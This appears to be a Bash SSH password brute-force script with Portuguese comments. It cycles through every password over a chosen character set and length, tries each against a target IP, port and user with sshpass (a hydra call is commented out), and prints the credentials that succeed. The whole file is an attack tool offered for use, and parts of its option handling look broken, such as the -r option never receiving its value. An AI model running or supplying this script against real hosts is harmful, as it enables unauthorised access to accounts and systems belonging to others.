#!/bin/bash
# [brute.sh]
# Developed by Guizith

#Este eh um script de brute force em ssh
#Para uso eh necessario utilizar o pacote HYDRA
#~sudo apt-get install hydra~

# Vetor
VETORNUM=

#Base, default=3
R=3

#Usuario de ssh
USRR='admin'
#Ip de ssh
IPADD=
#Porta de ssh
PORTT=22

#Universo de simbolos a ser utilizados na senha
UNIVERSO=
 
# Universos default.
U1='abcdefghijklmnopqrstuvwxyz'
U2='ABCDEFGHIJKLMNOPQRSTUVWXYZ'
U3='0123456789'
 
function help_me {
echo ' '
echo '=----------------> How to Use <----------------='
echo ' Permission Required: chmod 755 brute.sh'
echo './brute.sh [options]'
echo ''
echo '~~Type:'
echo '-h             This Help.'
echo '-u             User.(Default:admin).'
echo '-i             Ip Address.'
echo '-p             Access Port (Default:22).'
echo '-a             [a-z].'
echo '-A             [A-Z].'
echo '-d             [0-9].'
echo '-c <Universe>  Customize.'
echo '-r <length>    Size (Default: '$R').'
echo ' '
echo 'Developed by Guizith.'
echo ' '
exit 1
}
 
# Comando sem opcoes.
[ "$1" ] || help_me
 

#Tratamento de linha de comando.
while getopts 'u:i:p:haAdc:r' OPT
do
    
     case $OPT in
        "h") help_me; exit ;;
	"u") USRR=${OPTARG};;
	"i") IPADD=${OPTARG};;
	"p") PORTT=${OPTARG};;
	"a") UNIVERSO=${ALFABETO}${U1} ;;
        "A") UNIVERSO=${ALFABETO}${U2} ;;
        "d") UNIVERSO=${ALFABETO}${U3} ;;
        "c") UNIVERSO=${ALFABETO}${OPTARG} ;;
        "r") R=${OPTARG} ;;
        "?") echo 'Opcao invalida: '$OPT;
             echo 'Digite '$0' -h para mais ajuda.' ;
             exit 1 ;;
    esac
done

# Caso nao forneca nenhum simbolo
[ -z "$UNIVERSO" ] && echo 'Sem simbolos a serem processados.' && exit 1
 
# size
N=${#UNIVERSO}
 
while [ -z ${VETORNUM[R]} ]
do
    #loop de tentativas
    TRY=
    for (( i=0; i < R; i++ ))
    do
        index=${VETORNUM[i]}
        TRY=${UNIVERSO:index:1}${TRY}
    done
 


    
    # Mostra a saida e tenta conexao com ssh
    echo '~Tentando conexão com a senha:' $TRY
   # esys=$(hydra -l $USRR -p $TRY $IPADD -t 4 ssh -s $PORTT)
   esys=$(sshpass -p "$TRY" ssh $USRR@$IPADD -p $PORTT)
   #CTRL-D

   if [ "${esys}" != "" ]
    then
	  echo '-->Conexao aceita<--'
	  echo 'User:' $USRR
	  echo 'Ip Address:' $IPADD
	  echo 'Port:' $PORTT
	  echo 'Password:' $TRY
          exit
    fi


    # Incrementa a primeira posicao.
    let VETORNUM[0]++
 
    # Carry.
    for (( i=0; i < R; i++ ))
    do
        if [ "${VETORNUM[i]}" = "$N" ]
        then
            VETORNUM[i]=0 ;
            let VETORNUM[i+1]++ ;
        fi
    done
done
